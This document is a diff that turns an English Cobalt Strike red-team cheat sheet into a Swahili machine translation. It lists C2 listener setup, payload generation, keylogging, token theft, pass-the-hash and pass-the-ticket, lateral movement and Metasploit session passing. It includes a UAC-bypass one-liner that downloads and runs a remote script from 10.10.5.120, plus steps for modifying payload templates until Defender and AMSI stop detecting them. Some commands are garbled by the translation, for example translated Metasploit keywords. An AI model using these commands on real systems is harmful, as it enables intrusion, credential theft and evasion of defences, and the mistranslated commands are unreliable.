@@ -1,217 +1,206 @@
 # Cobalt Strike
 
-### Listeners
+### Wasikilizaji
 
-### C2 Listeners
+### Wasikilizaji wa C2
 
-`Cobalt Strike -> Listeners -> Add/Edit` then you can select where to listen, which kind of beacon to use (http, dns, smb...) and more.
+`Cobalt Strike -> Wasikilizaji -> Ongeza/Hariri` kisha unaweza kuchagua mahali pa kusikiliza, aina gani ya beacon ya kutumia (http, dns, smb...) na zaidi.
 
-### Peer2Peer Listeners
+### Wasikilizaji wa Peer2Peer
 
-The beacons of these listeners don't need to talk to the C2 directly, they can communicate to it through other beacons.
+Beacons ya wasikilizaji hawa hazihitaji kuongea na C2 moja kwa moja, wanaweza kuwasiliana nayo kupitia beacons nyingine.
 
-`Cobalt Strike -> Listeners -> Add/Edit` then you need to select the TCP or SMB beacons
+`Cobalt Strike -> Wasikilizaji -> Ongeza/Hariri` kisha unahitaji kuchagua beacons za TCP au SMB
 
-* The **TCP beacon will set a listener in the port selected**. To connect to a TCP beacon use the command `connect <ip> <port>` from another beacon
-* The **smb beacon will listen in a pipename with the selected name**. To connect to a SMB beacon you need to use the command `link [target] [pipe]`.
+* **Beacon ya TCP itaweka wasikilizaji kwenye bandari iliyochaguliwa**. Kwa kuunganisha kwenye beacon ya TCP tumia amri `connect <ip> <port>` kutoka kwa beacon nyingine
+* **Beacon ya smb itasikiliza kwenye jina la pipename lililochaguliwa**. Kwa kuunganisha kwenye beacon ya SMB unahitaji kutumia amri `link [target] [pipe]`.
 
-### Generate & Host payloads
+### Jenereta na Mwenyeji wa mizigo
 
-#### Generate payloads in files
+#### Jenereta ya mizigo kwenye faili
 
-`Attacks -> Packages ->`&#x20;
+`Mashambulizi -> Pakiti ->`&#x20;
 
-* **`HTMLApplication`** for HTA files
-* **`MS Office Macro`** for an office document with a macro
-* **`Windows Executable`** for a .exe, .dll orr service .exe
-* **`Windows Executable (S)`** for a **stageless** .exe, .dll or service .exe (better stageless than staged, less IoCs)
+* **`HTMLApplication`** kwa faili za HTA
+* **`MS Office Macro`** kwa hati ya ofisi yenye macro
+* **`Windows Executable`** kwa .exe, .dll au huduma .exe
+* **`Windows Executable (S)`** kwa **stageless** .exe, .dll au huduma .exe (bora stageless kuliko staged, chini ya IoCs)
 
-#### Generate & Host payloads
+#### Jenereta na Mwenyeji wa mizigo
 
-`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` This will generate a script/executable to download the beacon from cobalt strike in formats such as: bitsadmin, exe, powershell and python
+`Mashambulizi -> Web Drive-by -> Utoaji wa Wavuti ulioandikwa (S)` Hii itazalisha hati/utekelezaji wa kupakua beacon kutoka kwa cobalt strike katika muundo kama vile: bitsadmin, exe, powershell na python
 
-#### Host Payloads
+#### Mwenyeji wa Mizigo
 
-If you already has the file you want to host in a web sever just go to `Attacks -> Web Drive-by -> Host File` and select the file to host and web server config.
+Ikiwa tayari una faili unayotaka kuwa mwenyeji kwenye seva ya wavuti, nenda tu kwa `Mashambulizi -> Web Drive-by -> Mwenyeji wa Faili` na chagua faili ya kuwa mwenyeji na mpangilio wa seva ya wavuti.
 
-### Beacon Options
+### Chaguo za Beacon
 
-<pre class="language-bash"><code class="lang-bash"># Execute local .NET binary
+<pre class="language-bash"><code class="lang-bash"># Tekeleza .NET binary ya ndani
 execute-assembly &#x3C;/path/to/executable.exe>
 
-# Screenshots
-printscreen    # Take a single screenshot via PrintScr method
-screenshot     # Take a single screenshot
-screenwatch    # Take periodic screenshots of desktop
-## Go to View -> Screenshots to see them
+# Picha za skrini
+printscreen    # Chukua picha moja kupitia njia ya PrintScr
+screenshot     # Chukua picha moja
+screenwatch    # Chukua picha za skrini za kawaida
+## Nenda kwa View -> Screenshots kuwaona
 
 # keylogger
 keylogger [pid] [x86|x64]
-## View > Keystrokes to see the keys pressed
+## View > Keystrokes kuona herufi zilizobonyezwa
 
 # portscan
-portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
+portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Ingiza hatua ya portscan ndani ya mchakato mwingine
 portscan [targets] [ports] [arp|icmp|none] [max connections]
 
 # Powershell
-# Import Powershell module
+# Ingiza moduli ya Powershell
 powershell-import C:\path\to\PowerView.ps1
-powershell &#x3C;just write powershell cmd here>
+powershell &#x3C;andika amri za powershell hapa>
 
-# User impersonation
-## Token generation with creds
-make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
-ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
-rev2self # Stop using token generated with make_token
-## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.
+# Uigizaji wa mtumiaji
+## Uzalishaji wa token na creds
+make_token [DOMAIN\user] [password] # Unda token ili kujifanya kuwa mtumiaji kwenye mtandao
+ls \\computer_name\c$ # Jaribu kutumia token uliyounda kufikia C$ kwenye kompyuta
+rev2self # Acha kutumia token uliyounda na make_token
+## Matumizi ya make_token husababisha tukio la 4624: Akaunti ilifanikiwa kuingia. Tukio hili ni la kawaida sana katika kikoa cha Windows, lakini linaweza kupunguzwa kwa kuchuja kwa Aina ya Kuingia. Kama ilivyotajwa hapo juu, inatumia LOGON32_LOGON_NEW_CREDENTIALS ambayo ni aina 9.
 
 # UAC Bypass
-elevate svc-exe &#x3C;listener>
-elevate uac-token-duplication &#x3C;listener>
+elevate svc-exe &#x3C;wasikilizaji>
+elevate uac-token-duplication &#x3C;wasikilizaji>
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 
-## Steal token from pid
-## Like make_token but stealing the token from a process
-steal_token [pid] # Also, this is useful for network actions, not local actions
-## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated &#x3C;current_username> - it's impersonating our own cloned token.
-ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
-rev2self # Stop using token from steal_token
+## Chukua token kutoka kwa pid
+## Kama make_token lakini unachukua token kutoka kwa mchakato
+steal_token [pid] # Pia, hii ni muhimu kwa hatua za mtandao, sio hatua za ndani
+## Kutoka kwa nyaraka za API tunajua kuwa aina hii ya kuingia "inaruhusu mtumaji kuiga token yake ya sasa". Ndio maana Beacon inasema Impersonated &#x3C;current_username> - inajifanya kuwa token yetu iliyokopwa.
+ls \\computer_name\c$ # Jaribu kutumia token uliyounda kufikia C$ kwenye kompyuta
+rev2self # Acha kutumia token kutoka kwa steal_token
 
-## Launch process with nwe credentials
-spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
-## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).
+## Zindua mchakato na sifa mpya
+spawnas [domain\username] [password] [wasikilizaji] # Fanya hivyo kutoka kwenye saraka yenye ufikiaji wa kusoma kama: cd C:\
+## Kama make_token, hii itazalisha tukio la Windows 4624: Akaunti ilifanikiwa kuingia lakini na aina ya kuingia 2 (LOGON32_LOGON_INTERACTIVE). Itaelezea mtumiaji anayepiga simu (TargetUserName) na mtumiaji anayejifanya (TargetOutboundUserName).
 
-## Inject into process
-inject [pid] [x64|x86] [listener]
-## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).
+## Ingiza kwenye mchakato
+inject [pid] [x64|x86] [wasikilizaji]
+## Kutoka kwa mtazamo wa OpSec: Usifanye uingizaji wa msalaba-jukwaa isipokuwa unahitaji sana (k.m. x86 -> x64 au x64 -> x86).
 
-## Pass the hash
-## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
+## Pita hash
+## Mchakato huu wa ubadilishaji unahitaji kurekebisha kumbukumbu ya LSASS ambayo ni hatua ya hatari sana, inahitaji mamlaka ya msimamizi wa ndani na sio rahisi ikiwa Protected Process Light (PPL) imeamilishwa.
 pth [pid] [arch] [DOMAIN\user] [NTLM hash]
 pth [DOMAIN\user] [NTLM hash]
 
-## Pass the hash through mimikatz
+## Pita hash kupitia mimikatz
 mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
-## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
-steal_token &#x3C;pid> #Steal token from process created by mimikatz
+## Bila /run, mimikatz itazindua cmd.exe, ikiwa unatumia kama mtumiaji na Desktop, ataweza kuona kikao (ikiwa unatumia SYSTEM, unaendelea vizuri)
+steal_token &#x3C;pid> #Chukua token kutoka kwa mchakato uliozalishwa na mimikatz
 
-## Pass the ticket
-## Request a ticket
+## Pita tiketi
+## Omba tiketi
 execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
-## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
+## Unda kikao kipya cha kuingia kutumia tiketi mpya (ili isiwafute zile zilizodhuriwa)
 make_token &#x3C;domain>\&#x3C;username> DummyPass
-## Write the ticket in the attacker machine from a poweshell session &#x26; load it
+## Andika tiketi kwenye mashine ya mshambuliaji kutoka kwa kikao cha poweshell &#x26; ipakie
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
 kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
 
-## Pass the ticket from SYSTEM
-## Generate a new process with the ticket
+## Pita tiketi kutoka kwa SYSTEM
+## Zalisha mchakato mpya na tiketi
 execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
-## Steal the token from that process
+## Chukua token kutoka kwa mchakato huo
 steal_token &#x3C;pid>
 
-## Extract ticket + Pass the ticket
-### List tickets
+## Chukua tiketi + Pita tiketi
+### Onyesha tiketi
 execute-assembly C:\path\Rubeus.exe triage
-### Dump insteresting ticket by luid
+### Pindua tiketi za kuvutia kwa luid
 execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
-### Create new logon session, note luid and processid
+### Unda kikao kipya cha kuingia, chukua luid na processid
 execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
-### Insert ticket in generate logon session
+### Ingiza tiketi katika kikao cha kuingia kilichozalishwa
 execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
-### Finally, steal the token from that new process
+### Hatimaye, iba alama kutoka kwa mchakato huo mpya
 steal_token &#x3C;pid>
 
-# Lateral Movement
-## If a token was created it will be used
+# Harakisha kwa Upande
+## Ikiwa alama imeundwa, itatumika
 jump [method] [target] [listener]
-## Methods:
-## psexec                    x86   Use a service to run a Service EXE artifact
-## psexec64                  x64   Use a service to run a Service EXE artifact
-## psexec_psh                x86   Use a service to run a PowerShell one-liner
-## winrm                     x86   Run a PowerShell script via WinRM
-## winrm64                   x64   Run a PowerShell script via WinRM
+## Njia:
+## psexec                    x86   Tumia huduma kuendesha kipande cha EXE cha Huduma
+## psexec64                  x64   Tumia huduma kuendesha kipande cha EXE cha Huduma
+## psexec_psh                x86   Tumia huduma kuendesha mstari mmoja wa PowerShell
+## winrm                     x86   Endesha hati ya PowerShell kupitia WinRM
+## winrm64                   x64   Endesha hati ya PowerShell kupitia WinRM
 
 remote-exec [method] [target] [command]
-## Methods:
-<strong>## psexec                          Remote execute via Service Control Manager
-</strong>## winrm                           Remote execute via WinRM (PowerShell)
-## wmi                             Remote execute via WMI
+## Njia:
+<strong>## psexec                          Endesha kwa mbali kupitia Meneja wa Udhibiti wa Huduma
+</strong>## winrm                           Endesha kwa mbali kupitia WinRM (PowerShell)
+## wmi                             Endesha kwa mbali kupitia WMI
 
-## To execute a beacon with wmi (it isn't ins the jump command) just upload the beacon and execute it
+## Ili kutekeleza beacon na wmi (haipo katika amri ya jump) tu pakia beacon na kuitekeleza
 beacon> upload C:\Payloads\beacon-smb.exe
 beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
 
 
-# Pass session to Metasploit - Through listener
-## On metaploit host
-msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
-msf6 exploit(multi/handler) > set LHOST eth0
-msf6 exploit(multi/handler) > set LPORT 8080
+# Pita kikao kwa Metasploit - Kupitia msikilizaji
+## Kwenye mwenyeji wa metaploit
+msf6 > tumia exploit/multi/handler
+msf6 exploit(multi/handler) > weka payload windows/meterpreter/reverse_http
+msf6 exploit(multi/handler) > weka LHOST eth0
+msf6 exploit(multi/handler) > weka LPORT 8080
 msf6 exploit(multi/handler) > exploit -j
 
-## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
+## Kwenye cobalt: Wasikilizaji > Ongeza na weka Payload kuwa Foreign HTTP. Weka Mwenyeji kuwa 10.10.5.120, Bandari kuwa 8080 na bonyeza Hifadhi.
 beacon> spawn metasploit
-## You can only spawn x86 Meterpreter sessions with the foreign listener.
+## Unaweza kuzindua vikao vya Meterpreter x86 tu na msikilizaji wa kigeni.
 
-# Pass session to Metasploit - Through shellcode injection
-## On metasploit host
+# Pita kikao kwa Metasploit - Kupitia kuingiza shellcode
+## Kwenye mwenyeji wa metaploit
 msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
-## Run msfvenom and prepare the multi/handler listener
+## Chalaza msfvenom na andaa msikilizaji wa multi/handler
 
-## Copy bin file to cobalt strike host
+## Nakili faili ya bin kwenye mwenyeji wa cobalt strike
 ps
-shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process
+shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Ingiza msikilizaji wa metasploit shellcode katika mchakato wa x64
 
-# Pass metasploit session to cobalt strike
-## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
-## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode
+# Pita kikao cha metasploit kwa cobalt strike
+## Zalisha Beacon shellcode bila hatua, nenda kwa Mashambulizi > Pakiti > Windows Executable (S), chagua msikilizaji unaotaka, chagua Aina ya Matokeo kuwa Raw na chagua Tumia malipo ya x64.
+## Tumia post/windows/manage/shellcode_inject katika metasploit kuingiza shellcode ya cobalt strike iliyozalishwa
 
 
-# Pivoting
-## Open a socks proxy in the teamserver
+# Kubadilisha Mwelekeo
+## Fungua proxy ya socks kwenye timu ya seva
 beacon> socks 1080
 
-# SSH connection
-beacon> ssh 10.10.17.12:22 username password</code></pre>
+# Uunganisho wa SSH
+beacon> ssh 10.10.17.12:22 jina_la_mtumiaji nywila</code></pre>
 
-## Avoiding AVs
+## Kuepuka AVs
 
-### Artifact Kit
+### Kitu cha Sanaa
 
-Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.
+Kawaida katika `/opt/cobaltstrike/artifact-kit` unaweza kupata nambari na templeti zilizopangwa mapema (katika `/src-common`) za malipo ambayo cobalt strike itatumia kuzalisha beacons za binary.
 
-Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.
+Kwa kutumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) na mlango wa nyuma uliozalishwa (au tu na templeti iliyopangwa mapema) unaweza kugundua kinachosababisha defender kuzindua. Kawaida ni herufi. Kwa hivyo unaweza tu kurekebisha nambari ambayo inazalisha mlango wa nyuma ili herufi hiyo isionekane katika binary ya mwisho.
 
-After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.
-
+Baada ya kurekebisha nambari tu endesha `./build.sh` kutoka kwenye saraka ile ile na nakili folda ya `dist-pipe/` kwenye mteja wa Windows katika `C:\Tools\cobaltstrike\ArtifactKit`.
 ```
 pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 ```
+Usisahau kupakia script ya kushambulia kwa nguvu `dist-pipe\artifact.cna` ili kuonyesha Cobalt Strike kutumia rasilimali kutoka kwenye diski tunayotaka na sio zile zilizopakiwa.
 
-Don't forget to load the aggressive script `dist-pipe\artifact.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.
+### Jitihada za Rasilimali
 
-### Resource Kit
+Folda ya ResourceKit ina mifano ya malipo ya Cobalt Strike inayotegemea script ikiwa ni pamoja na PowerShell, VBA, na HTA.
 
-The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.
-
-Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templates you can find what is defender (AMSI in this case) not liking and modify it:
-
+Kwa kutumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) na mifano hii, unaweza kugundua ni nini kinachokataliwa na mfumo wa ulinzi (kama vile AMSI) na kubadilisha:
 ```
 .\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
 ```
+Kwa kubadilisha mistari iliyogunduliwa, mtu anaweza kuunda kigezo ambacho hakitakamatwa.
 
-Modifying the detected lines one can generate a template that won't be caught.
-
-Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.
-
-
-
-
-
-
-
+Usisahau kupakia script ya kushambulia `ResourceKit\resources.cna` ili kuonyesha Cobalt Strike kutumia rasilimali kutoka kwenye diski tunayotaka na sio zile zilizopakiwa.
 ```bash
 cd C:\Tools\neo4j\bin
 neo4j.bat console
@@ -233,3 +222,4 @@ pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 
 
 ```
+
